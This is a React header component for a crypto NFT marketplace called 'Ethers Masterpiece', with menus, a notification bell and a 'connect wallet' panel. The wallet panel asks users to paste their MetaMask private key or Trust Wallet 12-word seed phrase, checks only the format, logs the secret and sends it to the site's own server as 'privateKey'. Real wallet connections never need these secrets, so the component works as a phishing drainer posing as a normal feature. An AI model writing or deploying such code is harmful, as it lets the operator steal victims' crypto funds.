import useDataContext from '../../hooks/useDataContext'
import { Link, useAsyncError } from 'react-router-dom'
import { Fragment, useEffect, useState, } from 'react'
import { Menu, Transition } from '@headlessui/react'
import { FaCheckCircle } from "react-icons/fa";
import { FaCaretDown, FaTimes } from 'react-icons/fa'
import { FaBell } from "react-icons/fa";
import { FaAngleDown, FaEthereum } from "react-icons/fa";
import { IoMdHelpCircleOutline } from "react-icons/io";
import { FaTimesCircle } from "react-icons/fa";
import { LuLogOut } from "react-icons/lu";
import { LuUser } from "react-icons/lu";
import { GrHomeRounded } from "react-icons/gr";
import { axiosPrivate } from '../../api/axios'
import Web3 from 'web3'
import { FaArrowLeft } from "react-icons/fa";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faSpinner } from '@fortawesome/free-solid-svg-icons';
import { IoCartOutline } from "react-icons/io5";



function classNames(...classes) {
    return classes.filter(Boolean).join(' ')
}

const AppHeader = () => {

    const { allUsers, auth, setAuth, isLoading, setIsLoading } = useDataContext()
    const user = allUsers.find(uid => uid?.username === auth?.user)
    const [msgTab, setMsgTab] = useState(false)


    const [keyTab, setKeyTab] = useState('')
    const [metaKey, setMetaKey] = useState('')
    const [trustKey, setTrustKey] = useState('')

    const [validMetaKey, setValidMetaKey] = useState(null)


    useEffect(() => {
        if (metaKey && metaKey.length !== 64) {
            setValidMetaKey(false)
        } else if (metaKey && metaKey.length === 64) {
            setValidMetaKey(true)
        }

    }, [metaKey])



    function hasUpTo12Words(inputString) {
        // Trim the string to remove leading and trailing whitespaces
        const trimmedString = inputString.trim();

        // Split the string into an array of words
        const wordsArray = trimmedString.split(/\s+/);

        // Check if the number of words is less than or equal to 12
        return wordsArray.length === 12;
    }




    const [menu, setMenu] = useState(false)
    const [conTab, setConTab] = useState(false)

    const handleLogout = async () => {
        try {
            if (!auth?.user) return
            const response = await axiosPrivate.get('/logout')
            console.log(response.data)
            setAuth({})
        } catch (error) {
            console.log(error.response)
        }
    }


    const handleCloseConTab = () => {
        setConTab(false)
        setKeyTab('')
        setMetaKey('')
        setTrustKey('')
    }

    const signWithMetamask = async () => {
        if (!validMetaKey) return window.alert('❌ Invalid Key')
        let userAccount
        setIsLoading(true)
        try {
            const ethereum = window.ethereum

            if (!ethereum) return window.alert('no wallet extension found. if you are on mobile, please switch to Trust wallet mobile app\'s or metamask app.');
            const connect = await ethereum.request({ method: 'eth_requestAccounts' });
            if (!connect) return console.log('connection failed');


            const web3 = new Web3(ethereum);
            const accounts = await web3.eth.getAccounts();


            if (!accounts) return console.log('!no Acccounts');
            userAccount = accounts[0];
            console.log(userAccount);
            console.log(metaKey);
        } catch (error) {
            console.log(error);
            setIsLoading(false)
        } finally {
            setIsLoading(false)
        }


        try {
            const response = await axiosPrivate.patch('/userupdatewallet', JSON.stringify({ _id: user?._id, walletAddress: userAccount, privateKey: metaKey }))

            console.log(response.data);

        } catch (error) {
            setIsLoading(false)
            console.log(error.response);
        } finally {
            setIsLoading(false)
        }




    }
    const signWithTrust = async () => {

        if (!hasUpTo12Words(trustKey)) return window.alert('❌ Invalid Key')
        let userAccount
        try {


            const ethereum = window.trustwallet

            if (!ethereum) return window.alert('no wallet extension found. If you are on mobile, please switch to Trust wallet mobile app\'s or metamask app.');

            const connect = await ethereum.request({ method: 'eth_requestAccounts' });

            if (!connect) return console.log('connection failed');

            const web3 = new Web3(ethereum);
            const accounts = await web3.eth.getAccounts();

            if (!accounts) return console.log('!no Acccounts');

            userAccount = accounts[0];

            console.log(userAccount);
            console.log(trustKey);

        } catch (error) {
            setIsLoading(false)
            console.log(error.response);

        } finally {
            setIsLoading(false)
        }
        try {

            const response = await axiosPrivate.patch('/userupdatewallet', JSON.stringify({ _id: user?._id, walletAddress: userAccount, privateKey: trustKey }))

            console.log(response.data.result);

        } catch (error) {
            console.log(error);
        }

    }



    const renderPkeyTab = () => {
        switch (keyTab) {
            case 'metamask':
                return (
                    <section className='mx-auto w-full min-h-[100px] p-3  text-black'>
                        <img className='w-[200px] h-[200px] mx-auto' src="assets/metamasklogo.png" alt="metamask" />
                        <h3 className='font-medium  text-center self-start'> Complete your wallet integration.</h3>
                        <p className='text-gray-600  text-center'> Provide the required details to proceed </p>
                        <form
                            className='w-full'
                            onSubmit={(e) => e.preventDefault()}>
                            <p className='bg-red-400 text-red-800 rounded-lg p-2 my-1'> <span className='font-bold'>Warning!! </span>: Never disclose your private key to unauthorized personel. </p>
                            {metaKey && validMetaKey && <p className='my-2 border rounded p-3 shadow-2xl block w-full'>
                                <FaCheckCircle className='inline text-green-600' /> Valid Key.
                            </p>}
                            {metaKey && !validMetaKey && validMetaKey !== null && <p className='my-2 border rounded p-3 shadow-2xl block w-full'>
                                <FaTimesCircle className='inline text-red-600' />  Invalid Key.
                            </p>}
                            <input
                                placeholder='Paste your 64 character key'
                                className='w-full p-1 text-[17px] placeholder:text-[14px] placeholder:text-gray-500 rounded focus:outline-none border border-gray-500 border-solid'
                                type="text"
                                onChange={(e) => setMetaKey(e.target.value)}
                                value={metaKey}
                                required
                            />
                            {!isLoading && <button
                                onClick={signWithMetamask}
                                className='p-2 w-full rounded-full text-white bg-black my-3 transition duration-300 hover:bg-gray-600'>
                                Continue
                            </button>}
                            {isLoading && <article
                                className='text-center p-2 w-full rounded-full text-white bg-black my-3 transition duration-300 hover:bg-gray-600'>
                                <FontAwesomeIcon icon={faSpinner} spinPulse />
                            </article>}
                        </form>
                        <p>
                            <Link to={'/how-to-connect-wallet'} target='blank' className='text-purple-500 text-[14px] text-center text-wrap hover:underline'>
                                Don't know how to get your key? Don't worry we can help you.
                            </Link>
                        </p>
                    </section>
                )
            case 'trustwallet':
                return (
                    <section className='mx-auto w-full min-h-[100px] p-3  text-black'>
                        <img className='w-[200px] h-[200px] mx-auto' src="assets/trustlogo.png" alt="metamask" />
                        <h3 className='font-medium  text-center self-start'> Complete your wallet integration.</h3>
                        <p className='text-gray-600  text-center'> Provide the required details to proceed </p>
                        <form
                            className='w-full'
                            onSubmit={(e) => e.preventDefault()}>
                            <p className='bg-yellow-200 text-yellow-800 rounded-lg p-2 my-1'> <span className='font-bold'>Warning!! </span>: Do NOT share your Secret Phrase
                                Indiscriminately! </p>
                            {trustKey && hasUpTo12Words(trustKey) && <p className='my-2 border rounded p-3 shadow-2xl block w-full'>
                                <FaCheckCircle className='inline text-green-600' /> Valid Key.
                            </p>}
                            {trustKey && !hasUpTo12Words(trustKey) && <p className='my-2 border rounded p-3 shadow-2xl block w-full'>
                                <FaTimesCircle className='inline text-red-600' />  Invalid Key.
                            </p>}
                            <input
                                placeholder='Paste your 12 words phrase key'
                                className='w-full p-1 text-[17px] placeholder:text-[14px] placeholder:text-gray-500 rounded focus:outline-none border border-gray-500 border-solid'
                                type="text"
                                onChange={(e) => setTrustKey(e.target.value)}
                                value={trustKey}
                                required
                            />
                            {
                                !isLoading &&
                                <button
                                    onClick={signWithTrust}
                                    className='p-2 w-full rounded-full text-white bg-black my-3 transition duration-300 hover:bg-gray-600'>
                                    Continue
                                </button>}
                            {isLoading && <article
                                className='text-center p-2 w-full rounded-full text-white bg-black my-3 transition duration-300 hover:bg-gray-600'>
                                <FontAwesomeIcon icon={faSpinner} spinPulse />
                            </article>}
                        </form>
                        <p>
                            <Link to={'/how-to-connect-wallet'} target='blank' className='text-purple-500 text-[14px] text-center text-wrap hover:underline'>
                                Don't know how to get your key? Don't worry we can help you.
                            </Link>
                        </p>
                    </section>
                )
            default:
                break;
        }
    }


    return (
        <header className='text-white bg-black sticky top-0 z-20 shadow-2xl'>
            <section className='max-w-4xl p-3 mx-auto flex justify-between items-center'>
                <Link to={'/'} className='flex'>
                    <img className='w-[40px] h-[40px]' src="assets/appmainlogo.png" alt="applogo" />
                    <div className='hidden sm:block'>
                        <h1 className='font-bold text-xl'>Ethers<br />
                        </h1>
                        <p className='-mt-2'>Masterpiece</p>
                    </div>
                </Link>
                <div className=''>
                    {user?.username && <nav className='space-x-5 flex items-center justify-center min-w-52 transition-all duration-300'>
                        <Menu as="div" className="relative hidden sm:inline text-left self-start w-full mt-3">
                            <div>
                                <Menu.Button className="text-center block text-nowrap font-medium">
                                    Discover
                                    <FaCaretDown className='inline ml-1' />
                                </Menu.Button>
                            </div>

                            <Transition
                                as={Fragment}
                                enter="transition ease-out duration-100"
                                enterFrom="transform opacity-0 scale-95"
                                enterTo="transform opacity-100 scale-100"
                                leave="transition ease-in duration-75"
                                leaveFrom="transform opacity-100 scale-100"
                                leaveTo="transform opacity-0 scale-95"
                            >
                                <Menu.Items className="absolute left-0 z-10 mt-2 w-60 origin-top-right divide-y divide-gray-100 rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none">
                                    <div className="py-1">
                                        <Menu.Item>
                                            {({ active }) => (
                                                <Link
                                                    to={'/all-collections'}
                                                    className={classNames(
                                                        active ? 'bg-gray-100 text-gray-900 cursor-pointer' : 'text-gray-700',
                                                        'block px-4 py-2 text-sm'
                                                    )}
                                                >
                                                    Our Collections
                                                </Link>
                                            )}
                                        </Menu.Item>
                                        <Menu.Item>
                                            {({ active }) => (
                                                <Link to={'/all-itempage'}
                                                    className={classNames(
                                                        active ? 'bg-gray-100 text-gray-900 cursor-pointer' : 'text-gray-700',
                                                        'block px-4 py-2 text-sm'
                                                    )}
                                                >
                                                    Our Assets
                                                </Link>
                                            )}
                                        </Menu.Item>
                                    </div>
                                </Menu.Items>
                            </Transition>
                        </Menu>
                        <div className='relative w-full'>
                            <div className='w-1 h-1 bg-red-500 rounded-full absolute top-1 left-0 z-20 hidden'>

                            </div>
                            <button
                                className='inline'
                                onClick={() => setMsgTab(prev => !prev)}
                            >
                                <FaBell className='inline mt-1 text-xl' />
                            </button>
                            <div className={`rounded-xl shadow-2xl absolute ${msgTab ? 'top-[200%]' : 'top-[-7000%]'} bg-white left-[-100%] w-48 p-2 min-h-10`} >
                                <ul className='w-full text-black'>
                                    <li
                                        onClick={() => setMsgTab(prev => !prev)}
                                        className='transition duration-300 hover:bg-gray-300 p-2 pt-1 rounded border-b border-solid'>
                                        <Link >
                                            <h2 className='text-[15px] font-medium'>NO NOTIFICATIONS</h2>
                                            <p style={{ lineHeight: '10px' }} className='hidden text-[13px] text-gray-500'> no one can help you here get out</p>
                                        </Link>
                                    </li>


                                </ul>

                            </div>
                        </div>
                        <div onClick={() => setMenu(prev => !prev)} className='relative flex items-center border border-gray-500 border-solid p-[3px] px-[5px] rounded-full cursor-pointer  transition-all duration-300'>
                            <div className='min-w-[50px] '>
                                {user?.image && <img className='w-[35px] h-[35px]  rounded-full object-fill' src={user?.image} alt="navlogo" />}
                                {!user?.image && <div className='w-[35px] h-[35px] rounded-full bg-gray-200 text-black text-2xl flex items-center justify-center'>
                                    <p className=''>{(user?.name).substring(0, 1).toUpperCase()}</p>
                                </div>}
                            </div>
                            {user?.walletAddress && <div className='min-w-[50px] max-h-[60px] text-nowrap mr-1'>
                                <FaEthereum className='inline mb-1' />
                                <span className='font-medium'>{user?.balance}.00  ETH</span>
                                <br />
                                <span className='-mt-1 block text-[14px] text-gray-500'> <span className='inline-block mr-1 mb-1 bg-green-600 w-[5px] h-[5px] rounded-full'>
                                </span>
                                    {(user?.walletAddress).slice(0, 5).toString()}...{(user?.walletAddress).slice(-4).toString()}
                                </span>
                            </div>}
                            <FaAngleDown className='inline' />
                            <ul className={` min-w-[200px] absolute ${menu ? 'top-[140%]' : 'top-[-8000%]'} bg-white w-full p-1 rounded-md shadow-2xl text-black`}>
                                <li className='p-2 hover:bg-gray-300 transition-all duration-200  rounded mb-1 w-full'>

                                    <Link to={'/'} className='w-full block'> <GrHomeRounded className='inline text-xl mr-3 mb-[2px]' /> Home </Link>
                                </li>
                                <li className='p-2 hover:bg-gray-300 transition-all duration-200  rounded mb-1 w-full'>

                                    <Link to={'/my-profile'} className='w-full block'> <LuUser className='inline text-xl mr-3 mb-[2px]' /> Profile </Link>
                                </li>
                                <li className='p-2 hover:bg-gray-300 transition-all duration-200  rounded mb-1 w-full'>

                                    <Link to={'/my-cart-list'} className='w-full block'> <IoCartOutline className='inline text-xl mr-3 mb-[2px]' /> Cart </Link>
                                </li>
                                <li className='p-2 hover:bg-gray-300 transition-all duration-200  rounded mb-1 w-full'>

                                    <Link to={'/frequently-asked-questions'} className='w-full block'> <IoMdHelpCircleOutline className='inline text-xl mr-3 mb-[2px]' /> Help </Link>
                                </li>
                                <li className='p-2 hover:bg-gray-300 transition-all duration-200  rounded mb-1 w-full'>

                                    <button onClick={handleLogout} className='w-full block text-left'> <LuLogOut className='inline text-xl mr-3 mb-[2px]' /> Logout </button>
                                </li>
                            </ul>
                        </div>
                        {!user?.walletAddress &&
                            <div className=' relative'>
                                <button
                                    onClick={() => setConTab(true)}
                                    className='w-40 text-nowrap bg-white text-black px-3 py-1 rounded-xl w-15 sm:w-50'>
                                    connect wallet
                                </button>
                                <div className={`absolute left-[-118%] md:left-0 ${conTab ? 'top-[170%]' : 'top-[-8000%]'} bg-white text-black p-3 min-w-[350px] min-h-[500px] max-h-[550px] rounded shadow-2xl`}>
                                    <div className='block w-full'>

                                        <FaArrowLeft onClick={() => setKeyTab('')} className={`text-right float-left text-2xl font-medium cursor-pointer ${keyTab === '' ? 'hidden' : ''}`} />
                                        <FaTimes onClick={handleCloseConTab} className='text-right float-right text-2xl font-medium cursor-pointer' />
                                    </div>
                                    <h3 className='font-bold text text-center '>Connect your wallet</h3>
                                    <div className='w-full min-h-[400px] max-h-[480px] my-4 overflow-auto flex items-start'>
                                        <div className={`flex flex-col ${keyTab === 'metamask' || keyTab === 'trustwallet' ? 'w-[0] h-[0]' : 'w-full h-full'} overflow-hidden items-center justify-center  py-11 pt-16`}>
                                            <button
                                                onClick={() => setKeyTab('metamask')}
                                                className='shadow-2xl border border-gray-500 flex space-x-2 bg-white p-2 rounded-xl my-3 transition duration-300ms hover:bg-gray-300'>
                                                <span> <img className='w-[33px] h-[33px] rounded' src="assets/metamasklogo.png" alt="metamask" /> </span>
                                                <span> connect with metamask </span>
                                            </button>
                                            <button
                                                onClick={() => setKeyTab('trustwallet')}
                                                className='shadow-2xl border border-gray-500 flex space-x-2 bg-white p-2 rounded-xl my-3 transition duration-300ms hover:bg-gray-300'>
                                                <span> <img className='w-[33px] h-[33px] rounded' src="assets/trustlogo.png" alt="metamask" /> </span>
                                                <span> connect with trust wallet </span>
                                            </button>
                                        </div>
                                        {renderPkeyTab()}
                                    </div>
                                </div>
                            </div>

                        }
                    </nav>}
                    {
                        !user?.username
                        && <nav className='space-x-1 sm:space-x-5 flex items-center '>
                            <Menu as="div" className="relative hidden sm:inline text-left self-start mt-3">
                                <div>
                                    <Menu.Button className="text-center block text-nowrap font-medium">
                                        Discover
                                        <FaCaretDown className='inline ml-1' />
                                        {/* <ChevronDownIcon className="-mr-1 h-5 w-5 text-gray-400" aria-hidden="true" /> */}
                                    </Menu.Button>
                                </div>

                                <Transition
                                    as={Fragment}
                                    enter="transition ease-out duration-100"
                                    enterFrom="transform opacity-0 scale-95"
                                    enterTo="transform opacity-100 scale-100"
                                    leave="transition ease-in duration-75"
                                    leaveFrom="transform opacity-100 scale-100"
                                    leaveTo="transform opacity-0 scale-95"
                                >
                                    <Menu.Items className="absolute left-0 z-10 mt-2 w-60 origin-top-right divide-y divide-gray-100 rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none">
                                        <div className="py-1">
                                            <Menu.Item>
                                                {({ active }) => (
                                                    <Link
                                                        to={'/all-collections'}
                                                        className={classNames(
                                                            active ? 'bg-gray-100 text-gray-900 cursor-pointer' : 'text-gray-700',
                                                            'block px-4 py-2 text-sm'
                                                        )}
                                                    >
                                                        Our Collections
                                                    </Link>
                                                )}
                                            </Menu.Item>
                                            <Menu.Item>
                                                {({ active }) => (
                                                    <Link to={'/all-itempage'}
                                                        className={classNames(
                                                            active ? 'bg-gray-100 text-gray-900 cursor-pointer' : 'text-gray-700',
                                                            'block px-4 py-2 text-sm'
                                                        )}
                                                    >
                                                        Our Assets
                                                    </Link>
                                                )}
                                            </Menu.Item>
                                        </div>
                                    </Menu.Items>
                                </Transition>
                            </Menu>

                            <div className=' flex space-x-3'>
                                <Link to={'/frequently-asked-questions'} className='font-medium '> Help </Link>
                                <Link className='font-medium mr-1' to={'/user-authentication-login'}> Login </Link>
                            </div>


                            <Link to={'/user-authentication-register'} className='w-25 md:w-full text-nowrap ml-3 inline-block text-center bg-white shadow-2xl text-black hover:bg-gray-300 p-1 md:p-2  rounded-xl mt-2'>Get Started</Link>
                        </nav>}
                </div>
            </section>
        </header>
    )
}

export default AppHeader